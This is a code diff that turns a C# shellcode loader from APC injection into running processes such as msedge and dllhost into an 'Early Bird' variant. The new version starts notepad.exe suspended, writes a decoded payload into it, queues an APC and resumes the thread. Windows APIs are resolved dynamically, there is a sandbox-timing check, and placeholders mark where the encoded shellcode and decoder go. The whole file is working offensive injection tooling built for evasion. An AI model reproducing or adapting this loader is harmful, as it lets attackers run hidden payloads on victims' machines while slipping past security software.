@@ -9,7 +9,7 @@ using System.Text;
 using System.IO;
 using System.Collections.Generic;
 
-namespace apcqueue
+namespace EarlyBird
 {
     internal class Program
     {
@@ -30,9 +30,50 @@ namespace apcqueue
         }
 
         private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
         private static UInt32 PAGE_READWRITE = 0x04;
         private static UInt32 PAGE_EXECUTE_READ = 0x20;
+        private static UInt32 CREATE_SUSPENDED = 0x00000004;
 
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public unsafe byte* lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
         public class STRUCTS
         {
             // Structures and Enums 
@@ -429,10 +470,10 @@ namespace apcqueue
             public delegate IntPtr LoadLibrary(string name);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            public delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
+            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -440,14 +481,15 @@ namespace apcqueue
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate Int32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint ResumeThread(IntPtr hThread);
 
         }
 
@@ -685,52 +727,53 @@ namespace apcqueue
             }
         }
 
-        static void enhance(byte[] buf, Process process)
+        static void enhance(byte[] buf, string host)
         {
-            // thanks to https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/apc-injection-new-process.cs
-            // https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c
+            // thanks to https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
 
-            Console.WriteLine("Targeting {0}", process.Id);
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "OpenProcess");
-            DELEGATES.OpenProcess op = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenProcess)) as DELEGATES.OpenProcess;
-            IntPtr hProcess = op(0x001F0FFF, false, (uint)process.Id);
+            SECURITY_ATTRIBUTES lpSecurityAttributes = new SECURITY_ATTRIBUTES();
+
+            IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "CreateProcessA");
+            DELEGATES.CreateProcess cp = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
+            bool result = cp(null, host, ref lpSecurityAttributes, ref lpSecurityAttributes, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
+
+            if (result)
+            {
+                Console.WriteLine("Process created with PID: {0}", pi.dwProcessId);
+            }
+            else
+            {
+                Console.WriteLine("There was a problem creating the process.");
+                System.Environment.Exit(1);
+            }
+
+            IntPtr tProcess = pi.hProcess;
+            IntPtr tHandle = pi.hThread;
 
             pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
             DELEGATES.VirtualAllocEx vae = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
-            IntPtr resultPtr = vae(hProcess, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_READWRITE);
+            IntPtr resultPtr = vae(tProcess, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_READWRITE);
 
             IntPtr bytesWritten = IntPtr.Zero;
             pointer = Invoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
             DELEGATES.WriteProcessMemory wpm = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
-            bool resultBool = wpm(hProcess, resultPtr, buf, buf.Length, out bytesWritten);
+            bool resultBool = wpm(tProcess, resultPtr, buf, buf.Length, out bytesWritten);
 
-            foreach (ProcessThread thread in process.Threads)
-            {
-                Console.WriteLine("Found thread {0}", (uint)thread.Id);
+            pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
+            DELEGATES.VirtualProtectEx vpe = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
+            vpe(tProcess, resultPtr, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out _);
 
-                pointer = Invoke.GetLibraryAddress("kernel32.dll", "OpenThread");
-                DELEGATES.OpenThread ot = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenThread)) as DELEGATES.OpenThread;
-                IntPtr threadHandle = ot(ThreadAccess.THREAD_HIJACK, false, (uint)thread.Id);
+            pointer = Invoke.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+            DELEGATES.QueueUserAPC qua = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
+            qua(resultPtr, tHandle, IntPtr.Zero);
 
-                pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
-                DELEGATES.VirtualProtectEx vpe = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
-                vpe(hProcess, resultPtr, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out _);
-
-                pointer = Invoke.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
-                DELEGATES.QueueUserAPC qua = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
-                qua(resultPtr, threadHandle, IntPtr.Zero);
-            }
+            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
+            DELEGATES.ResumeThread rt = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
+            rt(tHandle);
         }
-
-        static Process[] boxboxbox(string host)
-        {
-
-            var processes = Process.GetProcessesByName(host);
-            
-            return processes;
-        }
-
         static bool buy_in()
         {
             DateTime t1 = DateTime.Now;
@@ -761,11 +804,11 @@ namespace apcqueue
 
         static void Main(string[] args)
         {
-            string[] hosts = {"dllhost", "msedge", "YourPhone", "smartscreen"};
+            string host = "C:\\Windows\\System32\\notepad.exe";
 
 
             !!!_SHELLCODE_MARK!!!
-
+            
 
             bool result = buy_in();
             if (!result)
@@ -776,34 +819,12 @@ namespace apcqueue
 
             cleaning();
 
-            List<Process> res = new List<Process>();
-            foreach (string host in hosts)
-            {
-                var processes = boxboxbox(host);
-                if (processes.Length != 0)
-                {
-                    foreach (Process process in processes){
-                        res.Add(process);
-                    }
-                }
-            }
 
-            if (res.Count == 0)
-            {
-                Console.WriteLine("Found no process");
-                System.Environment.Exit(1);
-            }
-            else
-            {
+            !!!DECODE_ROUTINE!!!
 
-                !!!DECODE_ROUTINE!!!
 
-                foreach (var process in res)
-                {
-                    Console.WriteLine("Found process {0}", process.Id);
-                    enhance(buf, process);
-                }
-            }
+            enhance(buf, host);
+
         }
     }
 }
